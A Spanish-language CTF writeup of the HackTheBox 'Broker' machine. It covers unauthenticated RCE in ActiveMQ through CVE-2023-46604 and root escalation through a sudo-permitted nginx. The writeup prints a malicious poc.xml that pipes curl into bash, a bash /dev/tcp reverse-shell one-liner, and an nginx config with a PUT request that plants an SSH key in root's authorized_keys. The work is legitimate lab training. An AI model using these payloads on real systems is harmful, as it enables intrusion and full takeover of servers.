---
title: "Broker"
date: 2025-05-29 16:41:25 +0200
categories: writeups HackTheBox
tags: activemq rce sudoers nginx máquina linux
description: Writeup de la máquina Broker de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Broker** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, aprenderemos como ejecutar comandos remotamente (**RCE Unauthenticated**) gracias a una vulnerabilidad descubierta en la versión **5.15.5** de **ActiveMQ**. Tras ganar acceso a la máquina víctima conseguiremos elevar nuestros privilegios gracias al permiso de **Sudoers** asignado el binario `/usr/bin/nginx`. En definitiva, a partir de un archivo de configuración nos montaremos un servidor HTTP con **nginx** en en el cual habilitaremos el método **PUT** para poder introducir nuestra `id_rsa.pub` en el `authorized_keys` del usuario **root**.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222051.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.243`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.243 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos un montón de puertos.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222316.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80,1883,5672,8161,34925,61613,61614,61616 -sCV 10.10.11.243 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es que está habilitado el servicio **ActiveMQ** debido a los puertos abieya que según **ChatGPT**: 

>_Los puertos predeterminados de ActiveMQ son 61616 (OpenWire), 61613 (STOMP), 5672 (AMQP), 1883 (MQTT), 8161 (web) y 61614 (AMQP over WebSockets)._

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222411.png>)
___
### Puerto 80 - HTTP (Nginx)

Tal y como vemos a continuación al acceder al puerto **80** nos saltará un panel de para autenticarnos.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222545.png>)

Si le damos a cancelar podemos ver la versión del servidor web **Jetty** pero tras buscar en internet llegaremos a la conclusión que no es vulnerable.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222621.png>)

En el anterior panel de login probaremos a introducir las típicas credenciales **admin:admin** y conseguiremos conectarnos correctamente.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222655.png>)

Tras navegar por el panel de administración podemos ver la versión del **ActiveMQ** (**5.15.5**).

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222708.png>)

___
## Explotación
### CVE-2023-46604 | RCE

Tras buscar exploits para dicha versión del **ActiveMQ** daremos con el siguiente **CVE** el cual nos permite tener **RCE** (**Remote Code Execution**).

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119222815.png>)

> Destacar que tras leer información sobre el **CVE** nos daremos cuenta que no es necesario estar autenticados **(RCE Unauthenticated)** para tener ejecución remota de comandos por lo que no hubiera pasado nada si no hubiéramos encontrado las credenciales (**admin:admin**). 

A continuación nos clonaremos el siguiente repositorio [Repositorio Github](https://github.com/evkl1d/CVE-2023-46604) gracias a la siguiente instrucción.

```bash
git clone https://github.com/evkl1d/CVE-2023-46604
```

El panel de ayuda del exploit nos indica que hemos de introducir la **Dirección IP** de la máquina víctima donde está alojado el servidor **ActiveMQ** (**10.10.11.243**), el puerto donde está alojado dicho servidor (por defecto es el **61616**) y la dirección URL donde estará alojado nuestro **poc.xml**.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119223207.png>)

En el fichero **poc.xml** indicaremos el comando que queremos ejecutar gracias a las etiquetas `<value>`, en este caso realizaremos una petición al fichero **index.html** (este fichero contiene el típico one liner de bash) y le concatenaremos una **bash** para recibir una **Reverse Shell**.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
		<constructor-arg>
		<list>
			<value>bash</value>
			<value>-c</value>
			<?-- Alertnativamente podemos usar el típico oneliner de bash: "ash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1 ?>
			<value>curl http://10.10.16.3/index.html | bash</value> 
		</list>
		</constructor-arg>
	</bean>
</beans>
```

> Alternativamente podemos usar el típico oneliner de bash pero tendremos que poner el ampersand (`&`) con `&amp;` y el signo de mayor (`>`) con `&gt;`, en definitiva el payload quedaría tal que así: `bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1`

Una vez que tenemos claro como funciona claro el exploit pasaremos a montar el servidor de python (`python3 -m http.server 80`) en el cual compartiremos el **poc.xml** y el **index.html**, también nos pondremos en escucha con **NetCat** (`nc -nvlp 443`) y finalmente ejecutaremos el exploit pasándole los argumentos correspondientes, es decir tal que así:

> Destacar que no he indicado el puerto (parámetro `-p`) ya que el exploit usa el de por defecto, es decir el **61616** el cual casualmente se está usando en la máquina vícitma.

```bash
python3 exploit.py -i 10.10.11.243 -u http://10.10.16.3/poc.xml
```

Al ejecutar el exploit nos daremos cuenta como recibiremos correctamente la **Reverse Shell** por lo que habremos ganado acceso correctamente a la máquina víctima.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119224136.png>)

___
## Escalada de privilegios
### Enumeración local

Tras ganar acceso a la máquina víctima haremos un **Tratamiento de la TTY** y nos daremos cuenta que tenemos asignado un permiso de **Sudoers**, gracias a este podemos ejecutar como cualquier usuario y sin proporcionar contraseña el binario **/usr/sbin/nginx**, es decir el servidor web de **nginx**.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119224255.png>)
### /usr/sbin/nginx

> Tras buscar por internet encontraremos el siguiente [Repositorio Github](https://github.com/DylanGrl/nginx_sudo_privesc) el cual nos automatiza la escalada de privilegios. 

En primer lugar, lo que debemos de hacer es revisar los permisos para ver si podemos sobrescribir el binario con el contenido que queramos, pero tal y como se aprecia abajo no podremos.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119231518.png>)

Nos copiaremos el fichero de configuración de **nginx** para modificarlo a nuestro gusto, es decir ejecutaremos el siguiente comando.

```bash
cp /etc/nginx/nginx.conf /tmp/nginx_pwned.conf
```

El contenido del fichero de configuración personalizado (**/tmp/nginx_pwned.conf**) contendrá el siguiente contenido. 

```python
user root; # Ejecutaremos el servidor web como el usuario root.
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
}

http {

	server {
		listen 1340; # Montaremos el servidor HTTP a través del puerto 1340.
		root /; # El DocumentRoot será la raíz del sistema (/) lo que nos permitirá tener acceso a todos los ficheros.
		autoindex on; # Habilitaremos el Directory Listing
		dav_methods PUT; # Habilitaremos el método PUT de HTTP.
	}

}
```

Ejecutaremos el binario **/usr/sbin/nginx** usando el parámetro `-c`, el cual nos permite indicar la ruta de nuestro archivo de configuración personalizado (**/tmp/nginx_pwned.conf**).

```bash
sudo /usr/sbin/nginx -c /tmp/nginx_pwned.conf
```

Si accedemos al servidor web (`http://10.10.11.243:1340`) podremos ver como tenemos acceso a todos los archivos del sistema desde una página web.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119234129.png>)

A continuación, generaremos un par de claves **ssh**, una pública (`id_rsa.pub`) y otra privada (`id_rsa`), en definitiva ejecutaremos el siguiente comando y le daremos al <kbd>Enter</kbd> cuantas veces sea necesario.

```bash
ssh-keygen
```

Tras generar un par de claves de **ssh** hemos de poner el contenido de nuestra clave pública (`id_rsa.pub`) en el `authorized_keys` del **root** para así poder conectarnos como dicho usuario sin necesidad de proporcionar contraseña, con el fin de lograr esto ejecutaremos el siguiente comando.

```bash
curl -X PUT localhost:1340/root/.ssh/authorized_keys -d "$(cat /home/activemq/.ssh/id_rsa.pub)" # El contenido de fichero id_rsa.pub lo meteremos en el authorized_keys del root para poder conectarnos como dicho usuario sin proporcionar contraseña.
```

Inmediatamente después nos conectaremos usando la clave privada (`id_rsa`) como el usuario **root** sin necesidad de proporcionar contraseña gracias a la siguiente instrucción.

```bash
ssh -i /home/activemq/.ssh/id_rsa root@localhost
```

Finalmente, veremos conseguimos conectarnos como el usuario **root**.

![](<../assets/images/posts/2025-05-29-broker/Pasted image 20250119225236.png>)